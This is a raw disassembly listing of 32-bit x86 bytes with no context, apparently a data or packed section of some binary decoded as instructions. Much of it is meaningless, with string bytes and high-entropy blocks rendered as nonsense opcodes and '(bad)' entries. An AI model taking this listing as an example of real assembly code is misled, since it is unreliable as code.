  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	push   edi
  413f01:	mov    ecx,0xd1dcf239
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    eax,0xcb000001
  413f0d:	loopne 0x413f3b
  413f0f:	pop    ss
  413f10:	inc    edi
  413f11:	stos   BYTE PTR es:[edi],al
  413f12:	out    0x8d,eax
  413f14:	test   al,0x38
  413f16:	push   ecx
  413f17:	jb     0x413f70
  413f19:	mov    BYTE PTR [edi],dh
  413f1b:	daa    
  413f1c:	mov    esp,0xca6d3b2a
  413f21:	sub    ah,BYTE PTR [ebp+0x5c]
  413f24:	outs   dx,BYTE PTR ds:[esi]
  413f25:	aas    
  413f26:	jb     0x413edf
  413f28:	pop    eax
  413f29:	retf   0xf746
  413f2c:	out    0x1f,al
  413f2e:	xor    cl,BYTE PTR [esi-0x3063690c]
  413f34:	ins    DWORD PTR es:[edi],dx
  413f35:	out    dx,al
  413f36:	push   es
  413f37:	dec    ebp
  413f38:	mov    edx,0x74e6edb8
  413f3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f3e:	xchg   edx,eax
  413f3f:	mov    ebx,es
  413f41:	lock lds esi,FWORD PTR [eax]
  413f44:	addr16 xor dh,al
  413f47:	adc    DWORD PTR [edi+0x2f],eax
  413f4a:	sub    al,0x4
  413f4c:	mov    edi,0xf5243ab0
  413f51:	lods   eax,DWORD PTR ds:[esi]
  413f52:	mov    ah,0xb6
  413f54:	enter  0x6220,0x43
  413f58:	out    0xc5,eax
  413f5a:	sahf   
  413f5b:	cmc    
  413f5c:	xchg   ebx,eax
  413f5d:	jne    0x413f45
  413f5f:	mov    dh,0xb8
  413f61:	test   eax,0x34364491
  413f66:	mov    al,0xbf
  413f68:	scas   eax,DWORD PTR es:[edi]
  413f69:	and    edi,DWORD PTR [edi+edx*2]
  413f6c:	pop    eax
  413f6d:	stos   BYTE PTR es:[edi],al
  413f6e:	fisttp WORD PTR [eax+edx*2+0xac1d458]
  413f75:	or     dh,bh
  413f77:	das    
  413f78:	outs   dx,DWORD PTR ds:[esi]
  413f79:	fild   DWORD PTR ds:0x32921aa6
  413f7f:	sbb    bl,BYTE PTR [edx]
  413f81:	sub    BYTE PTR [esp+eax*8-0x5918e630],bl
  413f88:	pop    eax
  413f89:	rol    BYTE PTR [ecx+ecx*1-0x5d],1
  413f8d:	pop    ebx
  413f8e:	and    eax,0x6c2c0352
  413f93:	in     eax,dx
  413f94:	ret    
  413f95:	push   esp
  413f96:	jmp    0x413fdb
  413f98:	shl    esp,0x3f
  413f9b:	lea    esi,gs:[eax+0x3e320b81]
  413fa2:	sti    
  413fa3:	dec    ebp
  413fa4:	and    eax,0x76b04fda
  413fa9:	cmp    DWORD PTR [esi+0x1c],0x7d3516ab
  413fb0:	lock push 0x1b3008e7
  413fb6:	out    0xc6,eax
  413fb8:	enter  0x4342,0xaa
  413fbc:	inc    dh
  413fbe:	cmp    BYTE PTR [ebx*1-0x5ac63b60],ch
  413fc5:	xor    dl,BYTE PTR [edi+0x28415389]
  413fcb:	js     0x41403e
  413fcd:	jp     0x413fa8
  413fcf:	sar    BYTE PTR [edi-0x355aaf53],1
  413fd5:	sbb    dh,BYTE PTR ds:0xd46f9df7
  413fdb:	sahf   
  413fdc:	ds pop esi
  413fde:	mov    ds:0x87cb02cd,al
  413fe3:	dec    ecx
  413fe4:	out    dx,al
  413fe5:	and    al,0x87
  413fe7:	rcl    DWORD PTR [ebx+0x0],0x34
  413feb:	fstp   QWORD PTR ss:[edi-0x7cdce2bb]
  413ff2:	shr    ch,0x44
  413ff5:	pop    es
  413ff6:	jno    0x41402d
  413ff8:	sbb    DWORD PTR [edi+0x32f28f0e],edx
  413ffe:	icebp  
  413fff:	in     eax,0x3b
  414001:	mov    al,ds:0xae82b040
  414006:	pop    ss
  414007:	cmc    
  414008:	sbb    edx,ebp
  41400a:	xor    BYTE PTR [edi+edi*4-0x44],0x53
  41400f:	out    dx,al
  414010:	sbb    al,0x0
	...
  414072:	add    BYTE PTR [eax],al
  414074:	pop    edx
  414075:	ficom  DWORD PTR [esi+0x60]
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x2031:0xc6d52e96
  414083:	(bad)  
  414084:	loope  0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    eax,0x1e000001
  41408d:	call   0xf40e:0x6833e437
  414094:	fisubr WORD PTR [eax]
  414096:	ror    BYTE PTR [ecx+0x75b9ea1d],1
  41409c:	pop    esi
  41409d:	das    
  41409e:	js     0x414037
  4140a0:	enter  0x7423,0xf
  4140a4:	or     ebx,DWORD PTR [ebp-0x2b05b70a]
  4140aa:	inc    ebp
  4140ab:	xor    DWORD PTR [ecx+0x3f],edi
  4140ae:	pop    es
  4140af:	mov    dh,al
  4140b1:	inc    ebp
  4140b2:	pop    edi
  4140b3:	sbb    BYTE PTR [ebx-0x3],0x5e
  4140b7:	jo     0x414091
  4140b9:	cmp    DWORD PTR [ebx-0x692cfc30],0x63
  4140c0:	test   BYTE PTR ds:[edi],ah
  4140c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140c4:	ds cmp cl,ch
  4140c7:	or     edi,eax
  4140c9:	jnp    0x4140e3
  4140cb:	sbb    bh,cl
  4140cd:	imul   ebp
  4140cf:	push   edi
  4140d0:	dec    ecx
  4140d1:	dec    ch
  4140d3:	outs   dx,BYTE PTR ds:[esi]
  4140d4:	js     0x414104
  4140d6:	arpl   si,ax
  4140d8:	jno    0x4140bc
  4140da:	or     ebx,esi
  4140dc:	mov    esi,0xb4004aa
  4140e1:	push   0x5a705b7f
  4140e6:	cmp    ecx,edi
  4140e8:	jmp    0x7194:0x9bbd066
  4140ef:	mov    esi,0x6782dc55
  4140f4:	pop    ecx
  4140f5:	daa    
  4140f6:	shl    DWORD PTR [edi+ebx*4+0x55],cl
  4140fa:	jmp    0x4140aa
  4140fc:	sub    al,BYTE PTR [edi-0x57a685c6]
  414102:	mov    esi,0xc3e1366
  414107:	enter  0xfd4d,0xb5
  41410b:	jmp    0x414134
  41410d:	bound  ecx,QWORD PTR [ebx+0x6e]
  414110:	ret    
  414111:	or     al,0xc8
  414113:	mul    DWORD PTR ds:0x409a31f7
  414119:	jne    0x414116
  41411b:	cmp    dh,BYTE PTR [edi-0x61e83f89]
  414121:	dec    ecx
  414122:	xchg   edx,eax
  414123:	jle    0x4140c5
  414125:	mov    ecx,0x17db2622
  41412a:	dec    edi
  41412b:	cmp    al,0x16
  41412d:	pop    esp
  41412e:	dec    ebp
  41412f:	cdq    
  414130:	pop    ebx
  414131:	loopne 0x4140cd
  414133:	mov    eax,0xa25b6d21
  414138:	xchg   esi,eax
  414139:	retf   
  41413a:	cmp    al,0xf7
  41413c:	mov    fs,WORD PTR [eax-0x3b]
  41413f:	std    
  414140:	add    DWORD PTR [ebp+0x7a],edi
  414143:	mov    eax,0x5506cccb
  414148:	mov    cl,0xe9
  41414a:	dec    eax
  41414b:	aad    0x4c
  41414d:	imul   edi,DWORD PTR [ebx-0x19],0xffffff94
  414151:	or     esi,ebx
  414153:	xor    edx,esi
  414155:	gs scas eax,DWORD PTR es:[edi]
  414157:	mov    DWORD PTR [esi-0x4f46dc47],edi
  41415d:	xor    DWORD PTR [edx-0x73cb4159],edx
  414163:	aam    0x8f
  414165:	inc    edx
  414166:	lods   eax,DWORD PTR ds:[esi]
  414167:	jne    0x414117
  414169:	inc    edx
  41416a:	inc    eax
  41416b:	leave  
  41416c:	scas   al,BYTE PTR es:[edi]
  41416d:	push   ds
  41416e:	mov    DWORD PTR [edx-0x36e677b3],ecx
  414174:	mov    al,ds:0x19845f13
  414179:	or     esp,esi
  41417b:	cld    
  41417c:	in     al,0x2e
  41417e:	loope  0x41413d
  414180:	cli    
  414181:	(bad)  
  414182:	jbe    0x414155
  414184:	cmp    dl,dh
  414186:	test   eax,0x57e9e914
  41418b:	js     0x414111
  41418d:	dec    edi
  41418e:	push   ebp
  41418f:	adc    ch,BYTE PTR [eax+0x0]
	...
  4141f2:	add    BYTE PTR [eax],al
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	sbb    al,0x72
  414202:	pop    ebp
  414203:	and    dh,0xd3
  414206:	add    BYTE PTR [eax],al
  414208:	add    eax,0x6c000001
  41420d:	mov    esp,0x5e580370
  414212:	dec    edx
  414213:	xor    eax,DWORD PTR [edi]
  414215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414216:	rcl    BYTE PTR [ebp-0x39657ea],cl
  41421c:	and    al,0xe9
  41421e:	(bad)  
  41421f:	popa   
  414220:	div    esp
  414222:	test   BYTE PTR [ebx-0x888d72f],0x33
  414229:	pop    ds
  41422a:	adc    BYTE PTR [ecx+0x3a],ah
  41422d:	xor    DWORD PTR [eax-0x7d],0xffffffed
  414231:	retf   0x5437
  414234:	lock xchg ebx,eax
  414236:	mov    ds:0x95e1085c,eax
  41423b:	adc    dl,BYTE PTR [eax]
  41423d:	sub    eax,0x82bd6b00
  414242:	cmp    DWORD PTR [edx-0x22],ecx
  414245:	mov    eax,ds:0xca1fa619
  41424a:	out    dx,eax
  41424b:	aad    0xff
  41424d:	test   al,0x59
  41424f:	ja     0x4142a3
  414251:	or     DWORD PTR [edi],0xd615a39c
  414257:	shl    BYTE PTR [ebp-0x65],cl
  41425a:	aam    0xbe
  41425c:	pop    es
  41425d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41425e:	push   ds
  41425f:	push   ecx
  414260:	push   0xffffff9a
  414262:	test   al,0xbc
  414264:	dec    edx
  414265:	inc    edx
  414266:	popa   
  414267:	fsubrp st(7),st
  414269:	ins    BYTE PTR es:[edi],dx
  41426a:	daa    
  41426b:	jne    0x4142ca
  41426d:	sbb    ebp,eax
  41426f:	out    0xf9,eax
  414271:	pop    ebp
  414272:	push   cs
  414273:	sub    al,0x69
  414275:	sbb    al,0xed
  414277:	je     0x414215
  414279:	push   esp
  41427a:	arpl   WORD PTR [edx+edi*1],dx
  41427d:	into   
  41427e:	jg     0x4142fa
  414280:	cmc    
  414281:	aaa    
  414282:	iret   
  414283:	push   esi
  414284:	xchg   esi,eax
  414285:	and    edx,DWORD PTR [edx-0x8]
  414288:	and    DWORD PTR [esi+ecx*1],edi
  41428b:	pushf  
  41428c:	mov    ah,0xf4
  41428e:	adc    eax,0xc60c5022
  414293:	fidiv  WORD PTR [ecx+0x2]
  414296:	shl    edx,0x82
  414299:	pop    esi
  41429a:	fisttp QWORD PTR [eax-0x73425abd]
  4142a0:	sbb    BYTE PTR [ebp+0x3e349053],bh
  4142a6:	lahf   
  4142a7:	dec    ecx
  4142a8:	sbb    DWORD PTR [eax],0xffffffd3
  4142ab:	cld    
  4142ac:	repz jne 0x4142e7
  4142af:	sbb    al,0x1e
  4142b1:	mov    ecx,0x457a7f6c
  4142b6:	loop   0x4142b7
  4142b8:	jnp    0x4142c5
  4142ba:	jge    0x4142fb
  4142bc:	mov    ch,BYTE PTR [esi+0x678c9372]
  4142c2:	(bad)  
  4142c3:	imul   ebx,ebp,0xffffff8a
  4142c6:	into   
  4142c7:	out    0x3a,al
  4142c9:	mov    ah,0x76
  4142cb:	popf   
  4142cc:	push   0xffffffc0
  4142ce:	or     al,0x9a
  4142d0:	shl    BYTE PTR [ebp-0x2],0x4d
  4142d4:	ret    
  4142d5:	pusha  
  4142d6:	sub    eax,0xc117bbb0
  4142db:	or     esp,0xffffffff
  4142de:	and    al,BYTE PTR [esi]
  4142e0:	mov    ah,0xc8
  4142e2:	jmp    0xf1976b82
  4142e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142e8:	hlt    
  4142e9:	cdq    
  4142ea:	mov    esp,DWORD PTR [ebp+0xe9e035f]
  4142f0:	lods   eax,DWORD PTR ds:[esi]
  4142f1:	or     eax,0xf618c924
  4142f6:	aam    0xef
  4142f8:	jg     0x414297
  4142fa:	xchg   ecx,eax
  4142fb:	and    DWORD PTR [ebx-0x503d2e09],esp
  414301:	pusha  
  414302:	push   ds
  414303:	adc    al,dh
  414305:	sub    eax,0xb27b2cb5
  41430a:	dec    ebp
  41430b:	les    esi,FWORD PTR [ebx-0x4301cc4c]
	...
  414371:	add    BYTE PTR [eax],al
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	pop    edi
  414381:	(bad)  
  414383:	das    
  414384:	jmp    0x41435a
  414386:	add    BYTE PTR [eax],al
  414388:	add    eax,0xf4000001
  41438d:	ffreep st(3)
  41438f:	mov    bh,0x93
  414391:	pop    eax
  414392:	pop    ebx
  414393:	mov    esi,0x1679075b
  414398:	pop    ecx
  414399:	xor    al,BYTE PTR fs:[ebp+0x62a58807]
  4143a0:	cwde   
  4143a1:	inc    ecx
  4143a2:	mov    esi,0x10dd6981
  4143a7:	fdivr  DWORD PTR [edi+0x78f4e0dc]
  4143ad:	fwait
  4143ae:	bound  esp,QWORD PTR [ebp-0xf]
  4143b1:	rcl    BYTE PTR [esi-0x6d67acd6],0x43
  4143b8:	or     BYTE PTR [ebx+0x41],0x3e
  4143bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143bd:	pop    edx
  4143be:	stc    
  4143bf:	xchg   edi,eax
  4143c0:	mov    al,0xc0
  4143c2:	inc    BYTE PTR [ecx+0x53]
  4143c5:	push   ecx
  4143c6:	sbb    al,dl
  4143c8:	dec    ebp
  4143c9:	leave  
  4143ca:	std    
  4143cb:	mov    ds:0x97353ee8,al
  4143d0:	js     0x414404
  4143d2:	sbb    BYTE PTR ds:0xf9ae31b1,ch
  4143d8:	fnstsw WORD PTR [ebx]
  4143da:	add    al,BYTE PTR [esi]
  4143dc:	sub    al,0x9b
  4143de:	in     al,0x97
  4143e0:	repz sbb eax,0x5509968
  4143e6:	scas   al,BYTE PTR es:[edi]
  4143e7:	jecxz  0x414450
  4143e9:	jae    0x414443
  4143eb:	pop    ebx
  4143ec:	or     al,0xde
  4143ee:	lock pop ds
  4143f0:	mov    edi,0xc39da0d1
  4143f5:	test   al,0x8b
  4143f7:	aam    0x88
  4143f9:	or     edx,ebp
  4143fb:	js     0x4143f4
  4143fd:	sahf   
  4143fe:	xchg   edi,eax
  4143ff:	pop    esi
  414400:	imul   ecx,DWORD PTR [ebx],0x12
  414403:	ror    BYTE PTR [ebp-0x80],cl
  414406:	sbb    dl,BYTE PTR [ebx+0x6773e1fc]
  41440c:	outs   dx,DWORD PTR ds:[esi]
  41440d:	xor    al,BYTE PTR [edi+0xa]
  414410:	mov    eax,ds:0xf7e1e396
  414415:	jge    0x4143a2
  414417:	pop    edx
  414418:	inc    ecx
  414419:	xor    cl,BYTE PTR [eax+0x41e05247]
  41441f:	mov    eax,0x8b429b45
  414424:	arpl   WORD PTR [edx+edx*8],dx
  414427:	retf   
  414428:	and    al,0x48
  41442a:	push   es
  41442b:	std    
  41442c:	sbb    DWORD PTR [ebx],edi
  41442e:	sbb    BYTE PTR [eax-0x1b],0xa8
  414432:	xchg   edx,eax
  414433:	jmp    0x414465
  414435:	(bad)
  414439:	mov    DWORD PTR [ebp+0x202b968e],eax
  41443f:	js     0x4144ab
  414441:	sti    
  414442:	jb     0x4144aa
  414444:	ret    0x9da3
  414447:	jge    0x4144b7
  414449:	mov    DWORD PTR [eax+0x340db2f7],edi
  41444f:	ja     0x414480
  414451:	push   esp
  414452:	lods   al,BYTE PTR ds:[esi]
  414453:	xchg   esi,eax
  414454:	mov    dh,0x36
  414456:	retf   
  414457:	aad    0xeb
  414459:	or     al,0xad
  41445b:	rol    DWORD PTR [eax+esi*8],1
  41445e:	(bad)  
  41445f:	loopne 0x414442
  414461:	or     al,0xe
  414463:	les    edx,FWORD PTR [esi+0x1bb53562]
  414469:	push   ecx
  41446a:	xor    BYTE PTR [eax],0x3f
  41446d:	dec    edi
  41446e:	push   ss
  41446f:	test   BYTE PTR [ebp-0x3],dl
  414472:	jbe    0x4144b8
  414474:	mov    ebp,0x273763ec
  414479:	push   cs
  41447a:	(bad)  
  41447b:	push   edi
  41447c:	mov    edi,0x5ace961b
  414481:	pop    edi
  414482:	retf   0x30cd
  414485:	retf   
  414486:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414487:	push   0x373c96df
  41448c:	jo     0x414459
  41448e:	xor    eax,0x4c07
	...
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi-0x5a]
  414501:	mov    cl,0x62
  414503:	adc    esi,eax
  414505:	aad    0x0
  414507:	add    BYTE PTR ds:0x6f000001,al
  41450d:	mov    bl,0xcc
  41450f:	xchg   esi,eax
  414510:	ins    DWORD PTR es:[edi],dx
  414511:	sar    DWORD PTR [ecx-0x5a6cfa03],cl
  414517:	in     al,0x74
  414519:	xor    al,0x59
  41451b:	mov    al,BYTE PTR [ebp+0x60]
  41451e:	dec    edi
  41451f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414520:	sbb    eax,DWORD PTR [ebx-0x753bd912]
  414526:	and    ebp,DWORD PTR [ebx+0x78f592c8]
  41452c:	ret    
  41452d:	dec    esi
  41452e:	sbb    esp,DWORD PTR [ebx-0x58]
  414531:	bt     DWORD PTR [edi+edx*8+0x3eb42f79],ecx
  414539:	shl    BYTE PTR [ecx-0x62],1
  41453c:	push   esi
  41453d:	xlat   BYTE PTR ds:[ebx]
  41453e:	push   edi
  41453f:	repnz aaa 
  414541:	adc    eax,0x4f7870b8
  414546:	push   ebp
  414547:	loop   0x4144d4
  414549:	pop    edi
  41454a:	imul   esp,ebp,0xa807c97
  414550:	stc    
  414551:	imul   ecx
  414553:	ins    BYTE PTR es:[edi],dx
  414554:	xchg   ebx,eax
  414555:	xchg   DWORD PTR [ebp-0x5b],esp
  414558:	in     al,dx
  414559:	mov    cl,bl
  41455b:	test   DWORD PTR [ecx+ebx*2+0x5018819e],esp
  414562:	and    al,0x78
  414564:	jo     0x41456e
  414566:	lock mov bl,bh
  414569:	es xchg ebx,eax
  41456b:	imul   edi,DWORD PTR [esi+0x63],0xfb1ac451
  414572:	or     eax,0xf1c806fa
  414577:	cs or  dh,al
  41457a:	test   BYTE PTR [ebx-0x1a457a4a],al
  414580:	fistp  WORD PTR [ebp+0x25]
  414583:	out    0x26,eax
  414585:	outs   dx,DWORD PTR ds:[esi]
  414586:	mov    cl,0xe8
  414588:	mov    ds:0xb2a2efc2,eax
  41458d:	or     eax,0xfe3704f2
  414592:	mov    es,WORD PTR [eax-0x774360a1]
  414598:	fbstp  TBYTE PTR ds:0x86cbda8b
  41459e:	imul   ebp,DWORD PTR [edx],0xcdcb638
  4145a4:	mov    ecx,0x94f14e15
  4145a9:	or     al,0x84
  4145ab:	(bad)  
  4145ad:	repnz jmp 0x8ed4:0x31563fb6
  4145b5:	in     al,dx
  4145b6:	xor    BYTE PTR [edi+0x2909f898],ah
  4145bc:	add    BYTE PTR [ebx+esi*8-0x72da6840],ah
  4145c3:	inc    eax
  4145c4:	push   ecx
  4145c5:	cmp    edi,DWORD PTR [ecx+0x49]
  4145c8:	inc    eax
  4145c9:	push   0xd3847955
  4145ce:	inc    eax
  4145cf:	add    BYTE PTR [edx],0x97
  4145d2:	inc    ebx
  4145d3:	sub    DWORD PTR [eax-0x6f],ebp
  4145d6:	popa   
  4145d7:	iret   
  4145d8:	loopne 0x414574
  4145da:	test   al,0x57
  4145dc:	retf   
  4145dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145de:	push   0x2e
  4145e0:	push   cs
  4145e1:	mov    al,ds:0x67dd784
  4145e6:	push   ebp
  4145e7:	jle    0x414633
  4145e9:	xchg   ebp,eax
  4145ea:	sbb    eax,DWORD PTR [ebp+0x1365be33]
  4145f0:	pushf  
  4145f1:	push   esi
  4145f2:	js     0x4145ea
  4145f4:	push   ds
  4145f5:	dec    ebp
  4145f6:	inc    eax
  4145f7:	jg     0x4145de
  4145f9:	repnz mov DWORD PTR [eax+0x52dafe0f],eax
  414600:	or     al,0x7f
  414602:	jmp    0x6765:0x5306a3da
  414609:	mov    ebp,?
  41460b:	or     DWORD PTR [esi+0x1c98694b],0x0
	...
  414672:	add    BYTE PTR [eax],al
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
